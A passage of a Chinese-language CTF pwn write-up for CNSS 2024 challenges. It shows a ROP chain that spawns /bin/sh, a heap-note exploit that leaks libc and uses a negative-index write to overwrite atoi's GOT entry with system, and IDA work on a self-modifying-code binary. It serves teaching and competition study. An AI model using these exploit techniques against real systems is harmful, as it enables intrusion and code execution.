<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx_rcx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">word!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 80 0x50
</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div> <h3 id="-凝眸回首映芳华">🗒 凝眸回首映芳华</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
CNSS 娘觉得市面上的笔记软件都不安全，有被泄露的风险，于是自己手搓了一个笔记软件雏形出来~

nc 152.136.11.155 10036

💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}

🔨 暴打出题人
@Timlzh
</code></pre></div></div> <h6 id="以下是出题人的心路历程">   以下是出题人的心路历程。</h6> <p><img src="https://www.helloimg.com/i/2024/09/27/66f65b0bb5560.png" alt="Screenshot 2024-09-27 112702.png"/> <img src="https://www.helloimg.com/i/2024/09/27/66f65b0bcdcc6.png" alt="Screenshot 2024-09-27 112735.png"/> <img src="https://www.helloimg.com/i/2024/09/27/66f65b0bc6c93.png" alt="Screenshot 2024-09-27 112746.png"/></p> <h5 id="看note知堆题增删改看功能齐活">   看note知堆题，增删改看功能齐活.</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/pwn/worktable/cnss2024/pwn8/pwn'</span>
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    SHSTK:      Enabled
    IBT:        Enabled
</code></pre></div></div> <h5 id="got表可写然后没有pie没有堆题常见的uaf堆溢出offset-by-one等不过即使具体漏洞还没找到也依然可以先-leak-libc--首先strings-libcso6--grep-glibc-可以看到版本为235所以铁有tcache">   GOT表可写、然后没有PIE。没有堆题常见的UAF、堆溢出、offset-by-one等。不过即使具体漏洞还没找到，也依然可以先 <code class="language-plaintext highlighter-rouge">leak libc</code> 。 <br/>   首先<code class="language-plaintext highlighter-rouge">strings ./libc.so.6 | grep "glibc"</code> 可以看到版本为2.35，所以铁有tcache</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 0 ~ 8
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  <span class="c1"># free 0~7
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span> <span class="c1"># 0 ~ 8
</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 8
</span><span class="nf">show</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div></div> <h5 id="show8时就把-libc-泄露了">   <code class="language-plaintext highlighter-rouge">show(8)</code>时就把 libc 泄露了<br/></h5> <h5 id="现在再来找具体的漏洞先关注一下堆信息的存储方式也就是1-create-a-new-page-of-notes">   现在再来找具体的漏洞<br/>   先关注一下堆信息的存储方式，也就是<code class="language-plaintext highlighter-rouge">1. Create a new page of notes</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
          <span class="n">v4</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter length: "</span><span class="p">);</span>
          <span class="n">v8</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v8</span><span class="p">);</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter content: "</span><span class="p">);</span>
          <span class="n">readstr</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">v8</span><span class="p">);</span>
          <span class="k">break</span><span class="p">;</span>
</code></pre></div></div> <h5 id="v8和mallocintv8那两行就表明了堆信息的存储方式对于这种东西我的意见是能看就看不能看直接动调如下">   <code class="language-plaintext highlighter-rouge">v8</code>和<code class="language-plaintext highlighter-rouge">malloc((int)v8)</code>那两行就表明了堆信息的存储方式。对于这种东西，我的意见是，能看就看，不能看直接动调，如下。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 申请一个0x10大小的堆，index = 0</span>
pwndbg&gt; x/10gx 0x4040C0
0x4040c0:       0x0000000000000010      0x00000000004052a0
0x4040d0:       0x0000000000000000      0x0000000000000000
0x4040e0:       0x0000000000000000      0x0000000000000000
0x4040f0:       0x0000000000000000      0x0000000000000000
0x404100:       0x0000000000000000      0x0000000000000000
</code></pre></div></div> <h5 id="从动调直接看出首先输入一个index确认从heap0x4040c0开始的偏移每16字节作为一个结构体前8个存堆大小后8个是堆的指针">   从动调直接看出，首先输入一个<code class="language-plaintext highlighter-rouge">index</code>，确认从heap(0x4040c0)开始的偏移，每16字节作为一个结构体，前8个存堆大小，后8个是堆的指针。</h5> <h5 id="接下来是2-view-notes就是打印">   接下来是<code class="language-plaintext highlighter-rouge">2. View notes</code>，就是打印</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
          <span class="n">v5</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
          <span class="n">puts</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
          <span class="k">break</span><span class="p">;</span>
</code></pre></div></div> <h5 id="用的puts所以才能把libc--offset带出来如果严格按堆大小输出上面leak-libc就没戏了">   用的<code class="language-plaintext highlighter-rouge">puts</code>，所以才能把<code class="language-plaintext highlighter-rouge">libc + offset</code>带出来，如果严格按堆大小输出，上面leak libc就没戏了。</h5> <h5 id="看看3-delete-notes">   看看<code class="language-plaintext highlighter-rouge">3. Delete notes</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
          <span class="n">v6</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
          <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
          <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v6</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">break</span><span class="p">;</span>
</code></pre></div></div> <h5 id="没有uaf下一个">   没有UAF，下一个</h5> <h5>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index: "</span><span class="p">);</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">readint</span><span class="p">();</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Enter content: "</span><span class="p">);</span>
      <span class="n">readstr</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">heap</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v7</span><span class="p">));</span>
</code></pre></div></div> <h5 id="也没啥好说的那整这么多没用的那么漏洞在哪里呢对于这道题的漏洞可能需要堆题方面的一些经验一般的堆题抛开堆信息的存储可能不同之外都有一些固定的规律第一堆的索引是系统分配程序查询可用索引进行分配第二堆的索引有一定限制不能过大也就是堆的申请数量有限制第三在分配或者释放堆块时首先对存放堆信息的位置检查确认目标位置避免造成指针重复覆盖或者free释放无效空间所以再看这道题这些特征完全没有这也是为什么整体的逻辑实现较短当我们回头再看case-1时发现v4和v8是有符号整型尤其v4由于堆信息的寻址不是数组访问v4在寻址时不会被转化为整型所以当v4为一个负数时反而会反向去寻址加上对该位置的赋值实际上这是一个任意写的漏洞不过只能每两个字长中写一个字长即使这样也已经足够了由于got表可写并且已经leak-libc所以考虑使用负索引向上修改got表要修改的got表需要满足两个条件首先got表项位于0x40xxx0到0x40xxx8这个位置被用于存放v8的值其次由于v8是int只有低4位可以覆盖需要更高的位置已经被填写所以我们需要一个已经重定位过的got表项考察上述两点于是选择atoi的got表改完之后在再发送binshx00即可">   也没啥好说的。<br/>   那整这么多没用的那么漏洞在哪里呢？对于这道题的漏洞，可能需要堆题方面的一些经验。<br/>   一般的堆题，抛开堆信息的存储可能不同之外，都有一些固定的规律。第一，堆的索引是系统分配，程序查询可用索引进行分配；第二，堆的索引有一定限制，不能过大，也就是堆的申请数量有限制；第三，在分配或者释放堆块时，首先对存放堆信息的位置检查，确认目标位置，避免造成指针重复覆盖或者<code class="language-plaintext highlighter-rouge">free()</code>释放无效空间。<br/>   所以再看这道题，这些特征完全没有，这也是为什么整体的逻辑实现较短。当我们回头再看<code class="language-plaintext highlighter-rouge">case 1</code>时，发现<code class="language-plaintext highlighter-rouge">v4</code>和<code class="language-plaintext highlighter-rouge">v8</code>是有符号整型，尤其<code class="language-plaintext highlighter-rouge">v4</code>，由于堆信息的寻址不是数组访问，<code class="language-plaintext highlighter-rouge">v4</code>在寻址时不会被转化为整型，所以当<code class="language-plaintext highlighter-rouge">v4</code>为一个负数时，反而会反向去寻址，加上对该位置的赋值，实际上这是一个任意写的漏洞，不过只能每两个字长中写一个字长，即使这样也已经足够了。<br/>   由于GOT表可写，并且已经leak libc，所以考虑使用负索引向上修改GOT表。要修改的GOT表需要满足两个条件。首先，GOT表项位于<code class="language-plaintext highlighter-rouge">0x40xxx0</code>到<code class="language-plaintext highlighter-rouge">0x40xxx8</code>，这个位置被用于存放<code class="language-plaintext highlighter-rouge">v8</code>的值；其次，由于<code class="language-plaintext highlighter-rouge">v8</code>是<code class="language-plaintext highlighter-rouge">int</code>，只有低4位可以覆盖，需要更高的位置已经被填写，所以我们需要一个已经重定位过的GOT表项。考察上述两点，于是选择<code class="language-plaintext highlighter-rouge">atoi()</code>的GOT表。<br/>   改完之后，在再发送<code class="language-plaintext highlighter-rouge">'/bin/sh\x00'</code>即可。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v8_4</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">low 4 bytes</span><span class="sh">"</span><span class="p">,</span> <span class="n">v8_4</span><span class="p">)</span>
<span class="nf">add</span><span class="p">({</span><span class="n">简单计算偏移得到的负索引</span><span class="p">},</span> <span class="n">v8_4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 更改后4bytes
</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div> <h3 id="-super-mario-code-revengehard">🎮 Super Mario Code Revenge(😡Hard)</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>⚠ 题目描述
Sh1no 出了一个简单的堆题。因为这个题太简单了所以 Sh1no 决定发挥他在 Re 里学到的高超技术——代码自解密壳来让你没法轻易逆向漏洞函数。

看不到了吧嘿嘿，快使用你高超的 Fuzz 技巧来试试吧！

nc 152.136.11.155 10038

💡 Hint
直接动态调试就可以看到加密部分的代码

💻 题目附件
点击下载

🚩 Flag格式
cnss{meaningful_sentence}
免责声明：flag 由 @Timlzh 提供

🔨 暴打出题人
@Shino
</code></pre></div></div> <h5 id="最先上的一道hard题属于是比较温油的hard但还是hard首先根据提示这个题使用了一个反逆向技术叫做自修改代码">   最先上的一道hard题，属于是比较温油的hard，但还是hard。<br/>   首先，根据提示，这个题使用了一个反逆向技术，叫做<code class="language-plaintext highlighter-rouge">自修改代码</code>。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"================================================"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"|          SUPER MARIO CODE REVENGE!!!         |"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"|  https://ctf-wiki.org/reverse/obfuscate/smc/ |"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"================================================"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter ur name to enter the Mario World!:"</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
  <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="n">marioGame</span> <span class="o">&amp;</span> <span class="o">-</span><span class="n">getpagesize</span><span class="p">());</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">getpagesize</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">mprotect</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>  <span class="c1">// &lt;---------- 从这里开始</span>
  <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">513</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">marioGame</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">10</span><span class="p">];</span>
    <span class="n">puts_banner</span><span class="p">();</span>         <span class="c1">// &lt;--------- 一个打印界面的函数</span>
    <span class="n">marioGame</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>       <span class="c1">// &lt;---------- 调用解密之后的函数</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Mario Dies. Plz Try again or contact @Shino."</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <h6 id="甚至把攻略贴在文件里哭死">   甚至把攻略贴在文件里，哭死。</h6> <h5 id="可以看到自修改代码就是在运行时解密代码由于ida是静态调试所以无法呈现正确的代码首先把加密代码段提权为rwx原本的text没有写权限然后从这个函数开始每十字节位一轮查表异或直到全部解密完成表是pwn5shino这十个字节">   可以看到，自修改代码就是在运行时解密代码，由于IDA是静态调试，所以无法呈现正确的代码。首先把加密代码段提权为rwx，原本的.text没有写权限，然后，从这个函数开始，每十字节位一轮，查表异或，直到全部解密完成。表是’Pwn5Shino!’这十个字节<br/></h5> <h5 id="看一眼mariogame">   看一眼<code class="language-plaintext highlighter-rouge">marioGame</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401236</span> <span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401236</span>                 <span class="n">mov</span>     <span class="n">ds</span><span class="o">:</span><span class="mi">3</span><span class="n">C8BE02006CF7078h</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040123</span><span class="n">F</span>                 <span class="n">imul</span>    <span class="n">edx</span><span class="p">,</span> <span class="n">ebx</span><span class="p">,</span> <span class="mi">2</span><span class="n">EBC469Bh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401245</span>                 <span class="n">mov</span>     <span class="n">ah</span><span class="p">,</span> <span class="mi">0</span><span class="n">Dh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401247</span>                 <span class="n">db</span>      <span class="mi">26</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401247</span>                 <span class="n">in</span>      <span class="n">al</span><span class="p">,</span> <span class="mi">25</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">A</span>                 <span class="n">jnz</span>     <span class="kt">short</span> <span class="n">loc_4012AB</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">C</span>                 <span class="n">outsb</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">D</span>                 <span class="n">xor</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">2</span><span class="n">BE02053h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401252</span>                 <span class="n">xchg</span>    <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401254</span>                 <span class="n">nop</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401254</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401255</span>                 <span class="n">db</span> <span class="mi">3</span><span class="n">Fh</span><span class="p">,</span> <span class="mf">0E3</span><span class="n">h</span><span class="p">,</span> <span class="mi">30</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span>                 <span class="n">jmp</span>     <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span><span class="o">+</span><span class="mi">69</span><span class="n">h</span><span class="p">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="mi">8</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040125</span><span class="n">B</span>                 <span class="n">db</span> <span class="mi">6</span><span class="n">Eh</span><span class="p">,</span> <span class="mi">27</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="n">A8h</span><span class="p">,</span> <span class="mi">97</span><span class="n">h</span><span class="p">,</span> <span class="mi">9</span><span class="n">Fh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">0000000000401260</span>                 <span class="n">dq</span> <span class="mi">946</span><span class="n">AE32197ACCB02h</span><span class="p">,</span> <span class="mi">3381</span><span class="n">AFDA7D6E775Dh</span><span class="p">,</span> <span class="mf">65E630</span><span class="n">E33FAFDE91h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040127</span><span class="mi">8</span>                 <span class="n">dq</span> <span class="mi">0</span><span class="n">CB209F97A8276E69h</span><span class="p">,</span> <span class="mi">775</span><span class="n">D996AE32197ACh</span><span class="p">,</span> <span class="mi">0</span><span class="n">DE915181AFDA7D6Eh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="mi">90</span>                 <span class="n">dq</span> <span class="mf">6E6965</span><span class="n">E230E33FAFh</span><span class="p">,</span> <span class="mi">6853356</span><span class="n">ECF97A827h</span><span class="p">,</span> <span class="mf">70E33</span><span class="n">FAFDE913581h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">A8</span>                 <span class="n">db</span> <span class="mi">0</span><span class="n">B3h</span><span class="p">,</span> <span class="mi">20</span><span class="n">h</span><span class="p">,</span> <span class="mf">0E0</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span> <span class="p">;</span> <span class="o">---------------------------------------------------------------------------</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">00000000004012</span><span class="n">AB</span> <span class="n">loc_4012AB</span><span class="o">:</span>                             <span class="p">;</span> <span class="n">CODE</span> <span class="n">XREF</span><span class="o">:</span> <span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mo">000000000040124</span><span class="n">A</span><span class="err">↑</span><span class="n">j</span>
</code></pre></div></div> <h5 id="可以看到ida虽然做出尝试但显然加密是有效的考虑使用先使用idapython对这一段内容解密注意先import-idc">   可以看到IDA虽然做出尝试，但显然加密是有效的。<br/>   考虑使用先使用IDApython，对这一段内容解密。注意先<code class="language-plaintext highlighter-rouge">import idc</code></h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f75f242322c.png" alt="Screenshot 2024-09-27 203200.png"/></p> <h5 id="下面是弄完后的效果">   下面是弄完后的效果。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f7606c5daf2.png" alt="Screenshot 2024-09-28 095529.png"/></p> <h5 id="可以看到识别了但也没完全识别和wiki上不一样这是因为x86有庞大的指令集这个函数实现逻辑略有复杂所以ida识别出现歧义也比较正常而且ida也没有检查反汇编结果是否合理这时候就需要做一个手动引导">   可以看到，识别了，但也没完全识别，和wiki上不一样。<br/>   这是因为x86有庞大的指令集，这个函数实现逻辑略有复杂，所以IDA识别出现歧义也比较正常，而且IDA也没有检查反汇编结果是否合理。这时候就需要做一个手动引导。<br/></h5> <h5 id="先打开动态调试动态调试中可以看到正确汇编代码">   先打开动态调试，动态调试中可以看到正确汇编代码。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f762523dc6a.png" alt="Screenshot 2024-09-28 100307.png"/></p> <h5 id="对于这种错误识别的汇编指令我们右键它点击undefine可以将其还原为单字节">   对于这种错误识别的汇编指令，我们右键它，点击<code class="language-plaintext highlighter-rouge">Undefine</code>，可以将其还原为单字节。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76156df32b.png" alt="Screenshot 2024-09-28 095912.png"/></p> <h5 id="右键然后assemble可以调出patch窗口注意只有汇编指令处才有这个选项所有指令打开的窗口都是同一个此时我们从动态调试中复制一条指令比如首个未能正确解析的指令mov----dword-ptr-rbp-0x24edi将它复制到assembly窗口栏中绿色代表从这个位置开始匹配指令粉色代表匹配到了指令的位置">   右键然后<code class="language-plaintext highlighter-rouge">Assemble...</code>，可以调出<code class="language-plaintext highlighter-rouge">Patch</code>窗口。注意只有汇编指令处才有这个选项，所有指令打开的窗口都是同一个。<br/>   此时我们从动态调试中复制一条指令，比如首个未能正确解析的指令<code class="language-plaintext highlighter-rouge">mov DWORD PTR [rbp-0x24],edi</code>，将它复制到<code class="language-plaintext highlighter-rouge">Assembly</code>窗口栏中。绿色代表从这个位置开始匹配指令，粉色代表匹配到了指令的位置。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76443642b4.png" alt="Screenshot 2024-09-28 101130.png"/></p> <h5 id="然后回车并退出这个窗口右键刚刚解放出来的单字节点击code就可以看到还原成功了">   然后，回车并退出这个窗口，右键刚刚解放出来的单字节，点击<code class="language-plaintext highlighter-rouge">Code</code>，就可以看到还原成功了。</h5> <p><img src="https://www.helloimg.com/i/2024/09/28/66f76581f28fe.png" alt="Screenshot 2024-09-28 101351.png"/></p> <h5 id="你可能发现一条指令正确识别了别的又错了这很正常重复上述操作需要注意有时候不需要手动汇编匹配右键就有code按也就是说不用一条指令一条指令地去匹配-弄完了之后记得和动态调试的结果对比一下">   